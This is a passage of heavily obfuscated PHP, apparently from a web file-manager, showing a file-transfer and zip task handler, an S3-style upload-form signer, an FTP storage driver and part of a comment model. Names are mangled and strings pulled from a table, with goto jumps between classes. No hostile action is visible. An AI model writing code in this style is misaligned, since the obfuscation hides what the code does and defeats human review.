$—Íøñ£->task[$µ›ÖÄŞ[408]]; $şÙ±îµ = $—Íøñ£->task[$µ›ÖÄŞ[408]]; if (!$—Íøñ£->task[$µ›ÖÄŞ[1559]]) { $—Íøñ£->task[$µ›ÖÄŞ[1559]] = $åÈıÎ… ? $åÈıÎ… : $şÙ±îµ; } break; case $µ›ÖÄŞ[1744]: if (!$‡ÌÃ®ÕÎ) { return echoLog($şÙ±îµ . $µ›ÖÄŞ[1745]); } $¦™ôñËš = is_string($‡ÌÃ®ÕÎ) ? array($‡ÌÃ®ÕÎ) : $‡ÌÃ®ÕÎ; $—Íøñ£ = new TaskFileTransfer($ãçƒ», $şÙ±îµ, 0, $åÈıÎ… ? $åÈıÎ… : $¦™ôñËš[0]); foreach ($¦™ôñËš as $êÑ÷§èí) { $—Íøñ£->addPath($êÑ÷§èí); } break; case $µ›ÖÄŞ[322]: if (!$‡ÌÃ®ÕÎ) { return echoLog($şÙ±îµ . $µ›ÖÄŞ[1745]); } $¦™ôñËš = is_string($‡ÌÃ®ÕÎ) ? array($‡ÌÃ®ÕÎ) : $‡ÌÃ®ÕÎ; $—Íøñ£ = new TaskZip($ãçƒ», $şÙ±îµ, 0, $åÈıÎ… ? $åÈıÎ… : $¦™ôñËš[0]); foreach ($¦™ôñËš as $êÑ÷§èí) { $—Íøñ£->addPath($êÑ÷§èí); } break; case $µ›ÖÄŞ[1212]: if (!$‡ÌÃ®ÕÎ) { return echoLog($şÙ±îµ . $µ›ÖÄŞ[1745]); } $—Íøñ£ = new TaskUnZip($ãçƒ», $şÙ±îµ, 0, $åÈıÎ… ? $åÈıÎ… : $‡ÌÃ®ÕÎ); if ($‡ÌÃ®ÕÎ) { $—Íøñ£->addFile($‡ÌÃ®ÕÎ); } break; case $µ›ÖÄŞ[158]: $—Íøñ£ = new TaskHttp($ãçƒ», $şÙ±îµ); break; default: return; break; } $this->task = $—Íøñ£; $this->taskID = $ãçƒ»; Hook::bind($µ›ÖÄŞ[1680], array($this, $µ›ÖÄŞ[1746])); Hook::bind($µ›ÖÄŞ[1682], array($this, $µ›ÖÄŞ[1747])); Hook::bind($µ›ÖÄŞ[1676], array($this, $µ›ÖÄŞ[1748])); echoLog($µ›ÖÄŞ[1749] . $—Íøñ£->task[$µ›ÖÄŞ[1559]]); } public function __destruct() { $this->end(); } public function end($Ñİó åñ = '') { $Àµ…šç =& $_SERVER[¹Û¹Æ€]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ñİó åñ); $this->task = !1; $this->taskID = !1; Hook::unbind($Àµ…šç[1680], array($this, $Àµ…šç[1746])); Hook::unbind($Àµ…šç[1682], array($this, $Àµ…šç[1747])); Hook::unbind($Àµ…šç[1676], array($this, $Àµ…šç[1748])); } public function taskUpdate($æì÷) { $±å’şà =& $_SERVER[¹Û¹Æ€]; if (!$æì÷ || $this->taskID != $æì÷[$±å’şà[408]]) { return; } $ˆ”¼¨ = 20; $¨ëí¶ÕÅ = intval($æì÷[$±å’şà[1661]] * $ˆ”¼¨); $ÙÜÍ§Ù² = $±å’şà[172] . str_repeat($±å’şà[881], $¨ëí¶ÕÅ) . $±å’şà[1011] . str_repeat($±å’şà[63], $ˆ”¼¨ - $¨ëí¶ÕÅ) . $±å’şà[174]; $®­®Üé = $ÙÜÍ§Ù² . sprintf($±å’şà[1750], $æì÷[$±å’şà[1661]] * 100) . $±å’şà[1751]; $€ó±¨Ş§ = $®­®Üé . $æì÷[$±å’şà[1660]] . $±å’şà[18] . $æì÷[$±å’şà[784]] . LNG($±å’şà[1752]); $—ÈçäÖœ = $±å’şà[22]; if ($æì÷[$±å’şà[1736]]) { $€ó±¨Ş§ = $®­®Üé . size_format($æì÷[$±å’şà[1660]]) . $±å’şà[18] . size_format($æì÷[$±å’şà[784]]); $—ÈçäÖœ = size_format($æì÷[$±å’şà[1662]]) . $±å’şà[1753]; } if ($æì÷[$±å’şà[1061]]) { $æì÷[$±å’şà[1710]] = $æì÷[$±å’şà[1061]] . $±å’şà[63] . $æì÷[$±å’şà[1710]]; } if ($æì÷[$±å’şà[1710]]) { $öµÃ—Í¶ = $±å’şà[22]; if ($æì÷[$±å’şà[1712]]) { $öµÃ—Í¶ = size_format($æì÷[$±å’şà[1713]]) . $±å’şà[18] . size_format($æì÷[$±å’şà[1712]]); } $—ÈçäÖœ .= $æì÷[$±å’şà[1710]] . $öµÃ—Í¶; } if ($æì÷[$±å’şà[761]]) { $—ÈçäÖœ .= $±å’şà[63] . size_format($æì÷[$±å’şà[1717]]) . $±å’şà[18] . size_format($æì÷[$±å’şà[761]]); } echoLog($€ó±¨Ş§ . $±å’şà[63] . $—ÈçäÖœ, !0); } public function taskEnd($óëéÅœ) { $ª·ÎƒË— =& $_SERVER[¹Û¹Æ€]; if (!$óëéÅœ || $this->taskID != $óëéÅœ[$ª·ÎƒË—[408]]) { return; } $•¬İ–­¦ = $óëéÅœ ? $óëéÅœ[$ª·ÎƒË—[1660]] . $ª·ÎƒË—[18] . $óëéÅœ[$ª·ÎƒË—[784]] . LNG($ª·ÎƒË—[1752]) . $ª·ÎƒË—[81] : $ª·ÎƒË—[22]; echoLog($ª·ÎƒË—[1754] . $óëéÅœ[$ª·ÎƒË—[1559]] . ($óëéÅœ[$ª·ÎƒË—[462]] ? $ª·ÎƒË—[81] . $óëéÅœ[$ª·ÎƒË—[462]] : $ª·ÎƒË—[22]) . $ª·ÎƒË—[81] . $•¬İ–­¦ . $ª·ÎƒË—[1755] . sprintf($ª·ÎƒË—[848], timeFloat() - $óëéÅœ[$ª·ÎƒË—[1663]]) . $ª·ÎƒË—[1675]); $this->end(); } public function taskKill($Ô¯î¦Ú°) { $ÓÚ¾ú¯  =& $_SERVER[¹Û¹Æ€]; if (!$Ô¯î¦Ú° || $this->taskID != $Ô¯î¦Ú°[$ÓÚ¾ú¯ [408]]) { return; } echoLog($ÓÚ¾ú¯ [1756] . $Ô¯î¦Ú°[$ÓÚ¾ú¯ [1559]]); } } goto bªùî„Á¾Î; A¸¯Ï áÓÚ: class PathDriverEDS extends PathDriverMinIO { public function __construct($¡Ö¥üøİ) { parent::__construct($¡Ö¥üøİ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($—ŸáÇÆ) { parent::__construct($—ŸáÇÆ); $this->signatureVersion($_SERVER[¹Û¹Æ€][226]); } public function uploadFormData($•ëø±ÓÓ, $ŸÊšœŠ = 3600) { $éæí²¥« =& $_SERVER[¹Û¹Æ€]; $ÛêÙí‹” = $éæí²¥«[208]; $Âú¬ûÒÒ = $éæí²¥«[1352]; $½ú³²ûÈ = $éæí²¥«[72]; $ë„ª…®÷ = gmdate($éæí²¥«[1353]); $õ¢úİÄ = gmdate($éæí²¥«[749]); $Ñ·êÍÎÇ = $éæí²¥«[1354]; $ÍÈšôî÷ = $ŸÊšœŠ . $éæí²¥«[22]; $à«¹¶¥ = $éæí²¥«[1316]; $ò•¹” = array($this->accessKey, $õ¢úİÄ, $this->region, $½ú³²ûÈ, $Ñ·êÍÎÇ); $ò§¶–­İ = implode($éæí²¥«[18], $ò•¹”); $ŒçÍÚš = array($éæí²¥«[1318] => gmdate($éæí²¥«[1317], strtotime($éæí²¥«[1355])), $éæí²¥«[1319] => array(array($éæí²¥«[1321] => $this->bucket), array($éæí²¥«[1320] => $ÛêÙí‹”), array($éæí²¥«[1322], $éæí²¥«[1323], $éæí²¥«[22]), array($éæí²¥«[1322], $éæí²¥«[1356], $éæí²¥«[22]), array($éæí²¥«[1322], $éæí²¥«[1357], $éæí²¥«[22]), array($éæí²¥«[1324] => $à«¹¶¥), array($éæí²¥«[1358] => $ò§¶–­İ), array($éæí²¥«[1359] => $Âú¬ûÒÒ), array($éæí²¥«[1360] => $ë„ª…®÷), array($éæí²¥«[1361] => $ÍÈšôî÷))); $©£Ğ†Ğê = base64_encode(json_encode($ŒçÍÚš)); $Î­¾Ôç = hash_hmac($éæí²¥«[1362], $õ¢úİÄ, $éæí²¥«[1363] . $this->secret, !0); $ÑÈ¾Õ‰ñ = hash_hmac($éæí²¥«[1362], $this->region, $Î­¾Ôç, !0); $áÕı¾Š’ = hash_hmac($éæí²¥«[1362], $½ú³²ûÈ, $ÑÈ¾Õ‰ñ, !0); $¾ÑŸØ‹Û = hash_hmac($éæí²¥«[1362], $Ñ·êÍÎÇ, $áÕı¾Š’, !0); $´º‡ ó = hash_hmac($éæí²¥«[1362], $©£Ğ†Ğê, $¾ÑŸØ‹Û); $ùÏùêÏ« = array($éæí²¥«[225] => $éæí²¥«[22], $éæí²¥«[1364] => $éæí²¥«[22], $éæí²¥«[1320] => $ÛêÙí‹”, $éæí²¥«[1324] => $à«¹¶¥, $éæí²¥«[1328] => $©£Ğ†Ğê, $éæí²¥«[1365] => $ò§¶–­İ, $éæí²¥«[1366] => $Âú¬ûÒÒ, $éæí²¥«[1367] => $ë„ª…®÷, $éæí²¥«[1368] => $ÍÈšôî÷, $éæí²¥«[1369] => $´º‡ ó, $éæí²¥«[191] => $this->getHost()); return $ùÏùêÏ«; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($³ã…ÙÎÓ) { parent::__construct(); if (count($³ã…ÙÎÓ) > 0) { $this->_init($³ã…ÙÎÓ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¼”ç˜°) { $Ôº’½ç­ =& $_SERVER[¹Û¹Æ€]; global $config; $this->appCharset = $config[$Ôº’½ç­[1370]]; $this->systemCharset = $config[$Ôº’½ç­[1371]]; if (isset($¼”ç˜°[$Ôº’½ç­[1372]]) && $¼”ç˜°[$Ôº’½ç­[1372]]) { $this->systemCharset = $¼”ç˜°[$Ôº’½ç­[1372]]; } } public function iconvApp($ÖßÏ²î‚) { return $this->iconvTo($ÖßÏ²î‚, $this->systemCharset, $this->appCharset); } public function iconvSystem($ËÕ½âæ’) { return $this->iconvTo($ËÕ½âæ’, $this->appCharset, $this->systemCharset); } public function getPathOuter($ş°Ú×¶í) { $ü¬½„…î =& $_SERVER[¹Û¹Æ€]; $ÎË±¥÷— = $this->iconvApp($this->pathBase); $ş°Ú×¶í = $this->iconvApp($ş°Ú×¶í); if (substr($ÎË±¥÷—, 0, 2) == $ü¬½„…î[1373]) { $ÎË±¥÷— = BASIC_PATH . substr($ÎË±¥÷—, 2); } if (substr($ş°Ú×¶í, 0, 2) == $ü¬½„…î[1373]) { $ş°Ú×¶í = BASIC_PATH . substr($ş°Ú×¶í, 2); } $ÎË±¥÷— = KodIO::clear($ÎË±¥÷—); $ş°Ú×¶í = KodIO::clear($ş°Ú×¶í); $ş°Ú×¶í = substr($ş°Ú×¶í, strlen($ÎË±¥÷—)); if (empty($this->pathDriver)) { return $ş°Ú×¶í; } return $this->pathDriver . $ü¬½„…î[18] . ltrim($ş°Ú×¶í, $ü¬½„…î[18]); } private function _init($ñœ“Ù¨‚ = array()) { $òÃï²ê =& $_SERVER[¹Û¹Æ€]; if (!function_exists($òÃï²ê[1374])) { throw new Exception(LNG($òÃï²ê[1375])); } $this->config = $ñœ“Ù¨‚; $this->charsetReset($ñœ“Ù¨‚); foreach ($ñœ“Ù¨‚ as $Â‹èòº‡ => $õçï¡Ê) { if (isset($this->{$Â‹èòº‡})) { $this->{$Â‹èòº‡} = $õçï¡Ê; } } return $this->_login($ñœ“Ù¨‚); } private function _login($§ÂÌßş) { $—ä¼šçí =& $_SERVER[¹Û¹Æ€]; static $Ì§†˜‡® = array(); $Òê³±ğÆ = md5(json_encode($§ÂÌßş)); if (isset($Ì§†˜‡®[$Òê³±ğÆ])) { foreach ($Ì§†˜‡®[$Òê³±ğÆ] as $‚Ìù–Ï => $“¯òÊÂ¿) { $this->{$‚Ìù–Ï} = $“¯òÊÂ¿; } return !0; } $«Ú†÷‡ = parse_url(trim($this->server, $—ä¼šçí[18])); $this->host = $«Ú†÷‡[$—ä¼šçí[191]]; $Ÿä¶ñ²ª = isset($«Ú†÷‡[$—ä¼šçí[190]]) && $«Ú†÷‡[$—ä¼šçí[190]] == $—ä¼šçí[1376] ? !0 : !1; $this->scheme = $Ÿä¶ñ²ª ? $—ä¼šçí[1377] : $—ä¼šçí[1378]; $this->port = isset($«Ú†÷‡[$—ä¼šçí[192]]) ? $«Ú†÷‡[$—ä¼šçí[192]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¸ÖÊŒ¡Š = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $÷Îå Ø˜ = $this->pasv == $—ä¼šçí[98] ? !0 : !1; @ftp_pasv($this->connect, $÷Îå Ø˜); $Ì§†˜‡®[$Òê³±ğÆ] = array($—ä¼šçí[1379] => $this->connect, $—ä¼šçí[191] => $this->host, $—ä¼šçí[190] => $this->scheme, $—ä¼šçí[192] => $this->port); return $¸ÖÊŒ¡Š; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Å²Øè´„, $Õ´Ş²† = '', $öèË©¯ˆ = REPEAT_RENAME) { if ($this->setContent($Å²Øè´„, $Õ´Ş²†)) { return $this->getPathOuter($Å²Øè´„); } return !1; } public function mkdir($÷®Åºáå, $û¦•äºŞ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $÷®Åºáå = $this->iconvSystem($÷®Åºáå); if ($this->_isFolder($÷®Åºáå) || @ftp_mkdir($this->connect, $÷®Åºáå)) { return $this->getPathOuter($÷®Åºáå); } if (!$this->mkdir($this->pathFather($÷®Åºáå))) { return !1; } if ($÷®Åºáå = @ftp_mkdir($this->connect, $÷®Åºáå)) { return $this->getPathOuter($÷®Åºáå); } return !1; } public function copyFile($Ë“öğÏÎ, $„šÜÍ–×) { if (!$this->_isconn()) { return !1; } $Õæíİİß = $this->pathThis($this->iconvSystem($Ë“öğÏÎ)); $ùÀ÷ªÔò = $this->tempFile($Õæíİİß); $Ç²”Åò÷ = $this->iconvApp($ùÀ÷ªÔò); $this->download($Ë“öğÏÎ, $Ç²”Åò÷); $ ğ³èÄĞ = $this->upload($„šÜÍ–×, $Ç²”Åò÷); $this->tempFileRemve($ùÀ÷ªÔò); return $ ğ³èÄĞ; } public function moveFile($Ò¾ÍşÑ, $ã÷âĞ­ı) { if (!$this->_isconn()) { return !1; } $Ò¾ÍşÑ = $this->iconvSystem($Ò¾ÍşÑ); $ã÷âĞ­ı = $this->iconvSystem($ã÷âĞ­ı); $ «ëå’¹ = @ftp_rename($this->connect, $Ò¾ÍşÑ, $ã÷âĞ­ı); return $ «ëå’¹ ? $this->getPathOuter($ã÷âĞ­ı) : !1; } public function delFile($ã™”Ï¬Ç) { if (!$this->_isconn()) { return !1; } $ã™”Ï¬Ç = $this->iconvSystem($ã™”Ï¬Ç); return @ftp_delete($this->connect, $ã™”Ï¬Ç); } public function delFolder($ÌÀì–î…) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÅŒæ—Á = $õØıê›ö = array(); $this->fileList($ÌÀì–î…, $ÅŒæ—Á, $õØıê›ö, !0); $this->listItemCache = !0; foreach ($õØıê›ö as $š²ë–Ëè) { $î¦Ëš¬‰ = $this->iconvSystem($š²ë–Ëè[$_SERVER[¹Û¹Æ€][42]]); $ŸÆÃõ–ò = @ftp_delete($this->connect, $î¦Ëš¬‰); if (!$ŸÆÃõ–ò) { return !1; } } foreach ($ÅŒæ—Á as $î¦Ëš¬‰) { $î¦Ëš¬‰ = $this->iconvSystem($î¦Ëš¬‰); $ŸÆÃõ–ò = @ftp_rmdir($this->connect, $î¦Ëš¬‰); if (!$ŸÆÃõ–ò) { return !1; } } $ÌÀì–î… = $this->iconvSystem($ÌÀì–î…); return @ftp_rmdir($this->connect, $ÌÀì–î…); } public function rename($î•Øò, $Ä¸üŸ†³) { $‚úçØ£ =& $_SERVER[¹Û¹Æ€]; if (!$this->_isconn()) { return !1; } $•ÅªàŒ = $this->fileNameAuto($this->pathFather($î•Øò), $Ä¸üŸ†³); $•ÅªàŒ = $this->iconvSystem($•ÅªàŒ); $î•Øò = $this->iconvSystem($î•Øò); $á×ÚâÎ£ = $this->pathFather($î•Øò); $­Æ¹‰Æ¤ = rtrim($á×ÚâÎ£, $‚úçØ£[18]) . $‚úçØ£[18] . $•ÅªàŒ; $»ü™ÎÚ¿ = @ftp_rename($this->connect, $î•Øò, $­Æ¹‰Æ¤); $­Æ¹‰Æ¤ = $this->iconvApp($­Æ¹‰Æ¤); return $»ü™ÎÚ¿ ? $this->getPathOuter($­Æ¹‰Æ¤) : !1; } private function folderInfo($ãş˜Üşí, $»’Ò †¤ = false) { $Èšµêüò =& $_SERVER[¹Û¹Æ€]; $¡ˆí‰ğ = array($Èšµêüò[42] => $this->pathThis($ãş˜Üşí), $Èšµêüò[94] => $this->getPathOuter($Èšµêüò[18] . $ãş˜Üşí), $Èšµêüò[43] => $Èšµêüò[85]); if ($»’Ò †¤) { return $¡ˆí‰ğ; } $¡ˆí‰ğ[$Èšµêüò[210]] = $¡ˆí‰ğ[$Èšµêüò[95]] = 0; $¡ˆí‰ğ[$Èšµêüò[211]] = $¡ˆí‰ğ[$Èšµêüò[212]] = !0; return $¡ˆí‰ğ; } private function fileInfo($Şş’ôé¹, $‡‚¸‰¼µ = false, $®¦­½÷± = array()) { $£ç±ôŠÉ =& $_SERVER[¹Û¹Æ€]; $›Òà„èƒ = array($£ç±ôŠÉ[42] => $this->pathThis($Şş’ôé¹), $£ç±ôŠÉ[94] => $this->getPathOuter($£ç±ôŠÉ[18] . $Şş’ôé¹), $£ç±ôŠÉ[43] => $£ç±ôŠÉ[209], $£ç±ôŠÉ[86] => isset($®¦­½÷±[$£ç±ôŠÉ[86]]) ? $®¦­½÷±[$£ç±ôŠÉ[86]] : 0, $£ç±ôŠÉ[184] => $this->ext($Şş’ôé¹)); if ($‡‚¸‰¼µ) { return $›Òà„èƒ; } $›Òà„èƒ[$£ç±ôŠÉ[210]] = $›Òà„èƒ[$£ç±ôŠÉ[95]] = 0; $›Òà„èƒ[$£ç±ôŠÉ[211]] = $›Òà„èƒ[$£ç±ôŠÉ[212]] = !0; $õ”„òèî = $this->iconvSystem($Şş’ôé¹); $›Òà„èƒ[$£ç±ôŠÉ[95]] = @ftp_mdtm($this->connect, $õ”„òèî); if (empty($®¦­½÷±)) { $®¦­½÷± = $this->objectMeta($Şş’ôé¹); if (!$®¦­½÷±) { return $›Òà„èƒ; } } $›Òà„èƒ[$£ç±ôŠÉ[86]] = $®¦­½÷±[$£ç±ôŠÉ[86]]; return $›Òà„èƒ; } public function size($ğ×Ô–á‡) { $‰ÓØãˆê = $this->objectMeta($ğ×Ô–á‡); return $‰ÓØãˆê ? $‰ÓØãˆê[$_SERVER[¹Û¹Æ€][86]] : 0; } public function info($Áå„òì) { if ($this->isFile($Áå„òì)) { return $this->fileInfo($Áå„òì, 0); } else { if ($this->isFolder($Áå„òì)) { return $this->folderInfo($Áå„òì); } } return !1; } private function fileList($Ûà´¥¢Æ, &$êÕ¤è²÷, &$ ±ì°ÔÓ, $Œ ×†Î = false) { $Üåì¾åª =& $_SERVER[¹Û¹Æ€]; $Ûà´¥¢Æ = $this->iconvSystem($Ûà´¥¢Æ); if (!$this->isFolder($Ûà´¥¢Æ)) { return !1; } @ftp_chdir($this->connect, $Üåì¾åª[18]); $Ûà´¥¢Æ = rtrim($Ûà´¥¢Æ, $Üåì¾åª[18]) . $Üåì¾åª[18]; check_abort(); $íÇÁğ = @ftp_rawlist($this->connect, $Ûà´¥¢Æ); if (!$íÇÁğ) { $íÇÁğ = array(); } $“ÜÁÇ© = array($Üåì¾åª[20] => 1, $Üåì¾åª[1380] => 1); foreach ($íÇÁğ as $…ÊñÒÅ„) { $ñ¼ü°õ˜ = $this->_listItem($…ÊñÒÅ„); if ($ñ¼ü°õ˜[0] == $Üåì¾åª[757]) { continue; } $ˆÁÑ€Õó = $ñ¼ü°õ˜[8]; if (empty($ˆÁÑ€Õó) && $ˆÁÑ€Õó !== $Üåì¾åª[207] || isset($“ÜÁÇ©[$ˆÁÑ€Õó])) { continue; } $ˆÁÑ€Õó = $this->iconvApp($Ûà´¥¢Æ . ltrim($ˆÁÑ€Õó, $Üåì¾åª[18])); $äûıËµÕ = array($Üåì¾åª[42] => $ˆÁÑ€Õó, $Üåì¾åª[43] => $Üåì¾åª[209], $Üåì¾åª[86] => $ñ¼ü°õ˜[4]); if (substr($…ÊñÒÅ„, 0, 1) == $Üåì¾åª[1381]) { $äûıËµÕ[$Üåì¾åª[43]] = $Üåì¾åª[85]; $äûıËµÕ[$Üåì¾åª[86]] = 0; } $ƒºí¤— = $äûıËµÕ[$Üåì¾åª[43]] == $Üåì¾åª[85] ? !0 : !1; $this->cacheMethodInfoSet($ˆÁÑ€Õó, $ƒºí¤—, $äûıËµÕ); if ($ƒºí¤—) { $êÕ¤è²÷[] = $ˆÁÑ€Õó; if ($Œ ×†Î) { $this->fileList($ˆÁÑ€Õó, $êÕ¤è²÷, $ ±ì°ÔÓ, $Œ ×†Î); } continue; } $ ±ì°ÔÓ[] = $äûıËµÕ; } $this->cacheMethodInfoSet($Ûà´¥¢Æ, !0); } private function _listItem($šÎçÒÏÑ) { if (empty($šÎçÒÏÑ)) { return array(); } $¯ù ˆ´· = preg_split($_SERVER[¹Û¹Æ€][1382], $šÎçÒÏÑ); if (count($¯ù ˆ´·) <= 9) { return $¯ù ˆ´·; } $¯ù ˆ´·[8] = trim(substr($šÎçÒÏÑ, strpos($šÎçÒÏÑ, $¯ù ˆ´·[7]) + strlen($¯ù ˆ´·[7]))); return array_splice($¯ù ˆ´·, 0, 9); } public function listPath($±ÏÈ—òû, $®ˆÑÀü¤ = false) { $•ÚÛöíË =& $_SERVER[¹Û¹Æ€]; if (!$this->_isconn()) { return !1; } $ØÔ£ßÊ˜ = $‹ËæÃªé = array(); $this->fileList($±ÏÈ—òû, $ØÔ£ßÊ˜, $‹ËæÃªé); foreach ($ØÔ£ßÊ˜ as $²¸·Æ => $¢ÉÈÜšú) { $ØÔ£ßÊ˜[$²¸·Æ] = $this->folderInfo($¢ÉÈÜšú, $®ˆÑÀü¤); } foreach ($‹ËæÃªé as $²¸·Æ => $¢ÉÈÜšú) { $‹ËæÃªé[$²¸·Æ] = $this->fileInfo($¢ÉÈÜšú[$•ÚÛöíË[42]], $®ˆÑÀü¤, $¢ÉÈÜšú); } return array($•ÚÛöíË[92] => $ØÔ£ßÊ˜, $•ÚÛöíË[93] => $‹ËæÃªé); } public function has($ÃŸ¸“Àï, $çÕî•šê = false, $‡«íçÃ¸ = true) { $™¡°€Ï× =& $_SERVER[¹Û¹Æ€]; $ëÈèùìË = $®¦¥ë“Ó = array(); $µæıÀĞÙ = $çÕî•šê ? !0 : !1; $this->fileList($ÃŸ¸“Àï, $ëÈèùìË, $®¦¥ë“Ó, $µæıÀĞÙ); if ($çÕî•šê) { return array($™¡°€Ï×[217] => count($®¦¥ë“Ó), $™¡°€Ï×[218] => count($ëÈèùìË)); } if ($‡«íçÃ¸) { if (count($®¦¥ë“Ó)) { return !0; } } else { if (count($ëÈèùìË)) { return !0; } } return !1; } public function listAll($—â…ÆİÏ) { $§İş¡à =& $_SERVER[¹Û¹Æ€]; if (!$this->_isconn()) { return !1; } $¹ÚÀÕ§– = $ÍÓ›‹Ü = array(); $this->fileList($—â…ÆİÏ, $¹ÚÀÕ§–, $ÍÓ›‹Ü, !0); $æîÀ“‡Ô = array(); foreach ($ÍÓ›‹Ü as $úª â‘é) { $æîÀ“‡Ô[$úª â‘é[$§İş¡à[42]]] = $úª â‘é[$§İş¡à[86]]; } foreach ($¹ÚÀÕ§– as $úª â‘é) { if (is_string($úª â‘é)) { $æîÀ“‡Ô[$úª â‘é] = 0; } } return $this->listAllFiles($—â…ÆİÏ, array_keys($æîÀ“‡Ô), $æîÀ“‡Ô); } public function getContent($ÑŸÖĞÒ¼) { if (!$this->_isconn()) { return !1; } $ÑŸÖĞÒ¼ = $this->iconvSystem($ÑŸÖĞÒ¼); return $this->fileSubstr($ÑŸÖĞÒ¼); } public function setContent($¨Öõ«¬, $Æ¿Ââë = '') { if (!$this->_isconn()) { return !1; } $àê«ØÑÜ = $this->pathThis($this->iconvSystem($¨Öõ«¬)); $÷‚¿·È‰ = $this->tempFile($àê«ØÑÜ); file_put_contents($÷‚¿·È‰, $Æ¿Ââë); $‰øõ¸Éƒ = $this->upload($¨Öõ«¬, $this->iconvApp($÷‚¿·È‰)); $this->tempFileRemve($÷‚¿·È‰); return $‰øõ¸Éƒ; } public function fileSubstr($×Ğ»€¤É, $›“Ú‡ÈÄ = 0, $¨ö”‚Áİ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($×Ğ»€¤É, $›“Ú‡ÈÄ, $¨ö”‚Áİ); } private function ftpRequest($–ªƒíÆ, $´Ûë¸ãÙ = 0, $•×ö§…Â = false) { $–ªƒíÆ = $this->iconvSystem($–ªƒíÆ); $ôÑÜ˜¬§ = $this->scheme . $this->host . $_SERVER[¹Û¹Æ€][4] . $this->port; $É˜ôØ“¿ = curl_init(); curl_setopt($É˜ôØ“¿, CURLOPT_URL, $ôÑÜ˜¬§ . $this->pathEncode($–ªƒíÆ)); curl_setopt($É˜ôØ“¿, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($•×ö§…Â) { $˜Ï”êÕ = $´Ûë¸ãÙ + $•×ö§…Â - 1; curl_setopt($É˜ôØ“¿, CURLOPT_RANGE, "{$´Ûë¸ãÙ}\x2d{$˜Ï”êÕ}"); } curl_setopt($É˜ôØ“¿, CURLOPT_RETURNTRANSFER, 1); $ŞØ’ÚÌ = curl_exec($É˜ôØ“¿); curl_close($É˜ôØ“¿); return $ŞØ’ÚÌ; } public function upload($õ‚©Ñ­º, $÷»ì ©®, $æª“Ê“ = false, $ŞÇš³Ëş = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($õ‚©Ñ­º))) { return !1; } $õ‚©Ñ­º = $this->iconvSystem($õ‚©Ñ­º); $÷»ì ©® = $this->iconvSystem($÷»ì ©®); $™¬¬¶“¿ = ftp_nb_put($this->connect, $õ‚©Ñ­º, $÷»ì ©®, FTP_BINARY); while ($™¬¬¶“¿ == FTP_MOREDATA) { $™¬¬¶“¿ = ftp_nb_continue($this->connect); } if ($™¬¬¶“¿ != FTP_FINISHED) { return !1; } return $this->getPathOuter($õ‚©Ñ­º); } public function download($çÂí¢££, $Î›ò»á = '') { if (!$this->_isconn()) { return !1; } $©Âùø¢à = $this->pathFather($Î›ò»á); if (!IO::mkdir($©Âùø¢à)) { return !1; } $çÂí¢££ = $this->iconvSystem($çÂí¢££); $Î›ò»á = $this->iconvSystem($Î›ò»á); $®ù¾“‹½ = ftp_nb_get($this->connect, $Î›ò»á, $çÂí¢££, FTP_BINARY); while ($®ù¾“‹½ == FTP_MOREDATA) { $®ù¾“‹½ = ftp_nb_continue($this->connect); } if ($®ù¾“‹½ != FTP_FINISHED) { return !1; } return $this->iconvApp($Î›ò»á); } public function exist($à¢¹åÁ¥) { return $this->isFile($à¢¹åÁ¥) || $this->isFolder($à¢¹åÁ¥); } public function isFile($ˆÕÌı¦ú) { return !$this->isFolder($ˆÕÌı¦ú) && $this->objectMeta($ˆÕÌı¦ú); } public function isFolder($ñ˜âŸä‘) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][175], $ñ˜âŸä‘); } protected function objectMeta($äÍˆÖ€µ) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][177], $äÍˆÖ€µ); } protected function _objectMeta($Ùî‹ğ ’) { $¥¼‡¿äÚ =& $_SERVER[¹Û¹Æ€]; if ($Ùî‹ğ ’ == $¥¼‡¿äÚ[22] || $Ùî‹ğ ’ == $¥¼‡¿äÚ[18]) { return array(); } if (!$this->_isconn()) { return !1; } $Ùî‹ğ ’ = $this->iconvSystem($Ùî‹ğ ’); $¶Ç…ß = array($¥¼‡¿äÚ[42] => $this->iconvApp($Ùî‹ğ ’), $¥¼‡¿äÚ[43] => $¥¼‡¿äÚ[209], $¥¼‡¿äÚ[86] => 0); @ftp_chdir($this->connect, $¥¼‡¿äÚ[18]); $éïãêÂ­ = @ftp_size($this->connect, $Ùî‹ğ ’); if ($éïãêÂ­ != -1) { $¶Ç…ß[$¥¼‡¿äÚ[86]] = $éïãêÂ­; } else { $ ´„ª‹œ = @ftp_chdir($this->connect, $Ùî‹ğ ’); if (!$ ´„ª‹œ) { return !1; } $¶Ç…ß[$¥¼‡¿äÚ[43]] = $¥¼‡¿äÚ[85]; } return $¶Ç…ß; } protected function _isFolder($Æİî½‰) { $Äı­ºş =& $_SERVER[¹Û¹Æ€]; if ($Æİî½‰ == $Äı­ºş[22] || $Æİî½‰ == $Äı­ºş[18]) { return !0; } $„Å„ßÜ± = $this->_objectMeta($Æİî½‰); return isset($„Å„ßÜ±[$Äı­ºş[43]]) && $„Å„ßÜ±[$Äı­ºş[43]] == $Äı­ºş[85] ? !0 : !1; } } goto bºÊŞ›·»á; BªåÄ†¼Ç°: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\141\155\x65" => "\x63\157\x6d\x6d\x65\x6e\x74\x5f\155\x65\x74\x61", "\x6d\145\164\x61\x46\x69\x65\154\144" => "\143\157\x6d\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const 